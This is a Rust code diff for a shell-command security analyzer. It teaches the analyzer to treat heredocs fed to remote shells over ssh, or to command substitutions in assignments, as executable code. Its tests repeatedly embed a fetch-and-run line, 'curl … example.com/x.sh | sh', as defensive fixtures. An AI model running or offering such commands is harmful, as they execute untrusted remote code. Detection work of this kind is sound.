@@ -5118,6 +5118,11 @@ struct HeredocReading {
     /// other than its script input, where a later read may run it, or the
     /// reader could not be found within the bounds.
     ambiguous: bool,
+    /// Every shell that runs the body runs it somewhere tirith's analysis
+    /// did not used to reach (a remote shell behind `ssh`), so the body is
+    /// analyzed best-effort: it adds the findings it proves, never an
+    /// incomplete-analysis block (see [`ExecutableBody::best_effort`]).
+    best_effort: bool,
 }
 
 impl HeredocReading {
@@ -5125,24 +5130,48 @@ impl HeredocReading {
     const DATA: Self = Self {
         shell: None,
         ambiguous: false,
+        best_effort: false,
     };
     const AMBIGUOUS: Self = Self {
         shell: None,
         ambiguous: true,
+        best_effort: false,
     };
 
     fn shell(shell: ShellType) -> Self {
         Self {
             shell: Some(shell),
             ambiguous: false,
+            best_effort: false,
         }
     }
 
-    /// The reading of a body that both `self` and `other` may read.
-    fn or(self, other: Self) -> Self {
+    /// A shell on another host (`ssh host sh <<'EOF'`) runs the body.
+    fn remote_shell(shell: ShellType) -> Self {
         Self {
-            shell: self.shell.or(other.shell),
+            shell: Some(shell),
+            ambiguous: false,
+            best_effort: true,
+        }
+    }
+
+    /// The reading of a body that both `self` and `other` may read. A local
+    /// shell reading wins over a best-effort one.
+    fn or(self, other: Self) -> Self {
+        let local = |reading: &Self| reading.shell.is_some() && !reading.best_effort;
+        let best_effort =
+            (self.shell.is_some() || other.shell.is_some()) && !local(&self) && !local(&other);
+        let shell = if local(&self) {
+            self.shell
+        } else if local(&other) {
+            other.shell
+        } else {
+            self.shell.or(other.shell)
+        };
+        Self {
+            shell,
             ambiguous: self.ambiguous || other.ambiguous,
+            best_effort,
         }
     }
 }
@@ -5451,9 +5480,20 @@ fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool)
         return HeredocReading::AMBIGUOUS;
     }
     let Some((command, args)) = resolve_wrapped_command_for_shell(segment, ShellType::Posix) else {
-        return HeredocReading::DATA;
+        return if on_stdin {
+            assignment_substitution_heredoc_reading(segment)
+        } else {
+            HeredocReading::DATA
+        };
     };
     let command = crate::rules::command::normalize_cmd_base(&command, ShellType::Posix);
+    if command == "ssh" {
+        return if on_stdin {
+            ssh_remote_heredoc_reading(&args)
+        } else {
+            HeredocReading::DATA
+        };
+    }
     let child_shell = match command.as_str() {
         "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "."
         | "source" => ShellType::Posix,
@@ -5487,6 +5527,114 @@ fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool)
         HeredocReading::shell(child_shell)
     } else {
         HeredocReading::AMBIGUOUS
+    }
+}
+
+/// The reader of a heredoc on an assignment-only command
+/// (`x=$(sh) <<'EOF'`). dash and zsh perform the redirection before they
+/// expand the assignment, so its command substitutions read the heredoc on
+/// standard input (bash and ksh do not, but `/bin/sh` is dash on Debian and
+/// Ubuntu). The body is code when one of those substitutions runs standard
+/// input as code; a command word, or no substitution, keeps it data.
+fn assignment_substitution_heredoc_reading(segment: &tokenize::Segment) -> HeredocReading {
+    let words = tokenize::split_words(&segment.raw);
+    let argv = crate::escalation::args_without_redirections(&words);
+    if argv.is_empty() || !argv.iter().all(|word| tokenize::is_env_assignment(word)) {
+        return HeredocReading::DATA;
+    }
+    let substitutions = executable_substitution_scan(&argv.join(" "), ShellType::Posix);
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    if substitutions
+        .bodies
+        .iter()
+        .any(|body| posix_body_accepts_pipeline_as_code(&body.input, 0, &mut remaining_bodies))
+    {
+        HeredocReading::shell(ShellType::Posix)
+    } else {
+        HeredocReading::DATA
+    }
+}
+
+/// OpenSSH options that take a value (`-p 22`, `-p22`).
+const SSH_VALUE_OPTIONS: &str = "BbcDEeFIiJLlmOoPpQRSWw";
+/// OpenSSH flags. `-N` (no command), `-n` and `-f` (standard input from
+/// `/dev/null`), `-s` (a subsystem, not a shell command), `-G` and `-V`
+/// (print and exit), and the `-O`, `-Q` and `-W` modes never hand standard
+/// input to a remote shell.
+const SSH_FLAG_OPTIONS: &str = "46AaCfGgKkMNnqsTtVvXxYy";
+
+/// The reader of a heredoc on `ssh`'s standard input. ssh forwards it to the
+/// remote command, so the body is code when that command runs standard input
+/// as a script (`ssh host sh <<'EOF'`, `ssh host bash -s <<'EOF'`,
+/// `ssh host sudo sh <<'EOF'`), or when there is no remote command and the
+/// remote login shell reads it (`ssh host <<'EOF'`). The remote shell is not
+/// the local one, so the body is analyzed best-effort: it adds what it
+/// proves (`curl … | sh`), never an incomplete-analysis block. A remote
+/// command that keeps the body as data (`ssh host 'cat > notes.txt'`), a
+/// mode that never reads it (`-n`, `-N`, `-f`, `-s`, `-O`, `-W`, ...), and a
+/// word tirith cannot read keep the released reading: data.
+fn ssh_remote_heredoc_reading(args: &[String]) -> HeredocReading {
+    let argv = crate::escalation::args_without_redirections(args);
+    let mut host = false;
+    let mut command_start = None;
+    let mut index = 0usize;
+    let mut options_ended = false;
+    while index < argv.len() {
+        let Some(word) = static_wrapper_word(&argv[index], ShellType::Posix) else {
+            return HeredocReading::DATA;
+        };
+        if !options_ended && word == "--" {
+            options_ended = true;
+            index += 1;
+            continue;
+        }
+        if !options_ended && word.len() > 1 && word.starts_with('-') {
+            let letters = &word[1..];
+            let mut consumed_next = false;
+            for (offset, letter) in letters.char_indices() {
+                if matches!(letter, 'N' | 'n' | 'f' | 's' | 'G' | 'V' | 'O' | 'Q' | 'W') {
+                    return HeredocReading::DATA;
+                }
+                if SSH_VALUE_OPTIONS.contains(letter) {
+                    consumed_next = offset + letter.len_utf8() == letters.len();
+                    break;
+                }
+                if !SSH_FLAG_OPTIONS.contains(letter) {
+                    return HeredocReading::DATA;
+                }
+            }
+            index += if consumed_next { 2 } else { 1 };
+            continue;
+        }
+        if host {
+            command_start = Some(index);
+            break;
+        }
+        host = true;
+        // OpenSSH parses options after the destination too, until the first
+        // operand of the remote command; `--` there still ends them.
+        index += 1;
+    }
+    if !host {
+        return HeredocReading::DATA;
+    }
+    let Some(start) = command_start else {
+        return HeredocReading::remote_shell(ShellType::Posix);
+    };
+    let mut words = Vec::with_capacity(argv.len() - start);
+    for raw in &argv[start..] {
+        let Some(word) = static_wrapper_word(raw, ShellType::Posix) else {
+            return HeredocReading::DATA;
+        };
+        words.push(word);
+    }
+    // The remote shell parses the words joined by spaces.
+    let remote = words.join(" ");
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    if posix_body_accepts_pipeline_as_code(&remote, 0, &mut remaining_bodies) {
+        HeredocReading::remote_shell(ShellType::Posix)
+    } else {
+        HeredocReading::DATA
     }
 }
 
@@ -6540,8 +6688,9 @@ impl PosixHeredocRecovery {
                 unescape_unquoted_heredoc(&body)
             };
             if !input.trim().is_empty() {
-                self.bodies
-                    .push(ExecutableBody::without_origin(input, shell));
+                let mut executable = ExecutableBody::without_origin(input, shell);
+                executable.best_effort = reading.best_effort;
+                self.bodies.push(executable);
             }
         }
     }
@@ -22402,5 +22551,90 @@ mod stream_device_tests {
             standard_stream_device("/dev/stderr"),
             Some(StreamDevice::Named(2))
         );
+    }
+}
+
+#[cfg(test)]
+mod remote_heredoc_reader_tests {
+    use super::*;
+
+    fn heredoc_bodies(input: &str) -> Vec<(String, bool)> {
+        executable_substitution_scan(input, ShellType::Posix)
+            .bodies
+            .into_iter()
+            .map(|body| (body.input, body.best_effort))
+            .collect()
+    }
+
+    /// ssh hands its standard input to the remote command: a shell that reads
+    /// its script from stdin, or the login shell when there is no command.
+    /// The body is read best-effort.
+    #[test]
+    fn heredocs_fed_to_a_remote_shell_are_best_effort_code() {
+        for input in [
+            "ssh host sh <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host bash -s <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -p 2222 -o BatchMode=yes deploy@host <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host -t sudo sh <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host 'bash -s' -- arg <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+        ] {
+            let bodies = heredoc_bodies(input);
+            assert!(
+                bodies
+                    .iter()
+                    .any(|(body, best_effort)| body.contains("curl") && *best_effort),
+                "{input}: {bodies:?}"
+            );
+        }
+        for input in [
+            "ssh host 'cat > notes.txt' <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host tee /tmp/notes <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -n host sh <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -N host <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh -s host sftp <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host \"$CMD\" <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "ssh host sh 3<<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+        ] {
+            let bodies = heredoc_bodies(input);
+            assert!(
+                !bodies.iter().any(|(body, _)| body.contains("curl")),
+                "{input}: {bodies:?}"
+            );
+        }
+    }
+
+    /// dash and zsh run an assignment-only command's substitutions with the
+    /// heredoc on standard input.
+    #[test]
+    fn heredocs_on_assignment_substitutions_are_code_when_a_shell_reads_them() {
+        let bodies =
+            heredoc_bodies("x=$(sh) <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF");
+        assert!(
+            bodies
+                .iter()
+                .any(|(body, best_effort)| body.contains("curl") && !*best_effort),
+            "{bodies:?}"
+        );
+        for input in [
+            "x=$(cat) <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+            "x=1 <<'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+        ] {
+            let bodies = heredoc_bodies(input);
+            assert!(
+                !bodies.iter().any(|(body, _)| body.contains("curl")),
+                "{input}: {bodies:?}"
+            );
+        }
+    }
+
+    /// A local shell reading wins over a remote one when both read a body.
+    #[test]
+    fn heredoc_reading_or_prefers_local_shells() {
+        let local = HeredocReading::shell(ShellType::Posix);
+        let remote = HeredocReading::remote_shell(ShellType::Posix);
+        assert!(!remote.or(local).best_effort);
+        assert!(!local.or(remote).best_effort);
+        assert!(remote.or(HeredocReading::DATA).best_effort);
+        assert!(!HeredocReading::DATA.or(HeredocReading::DATA).best_effort);
     }
 }
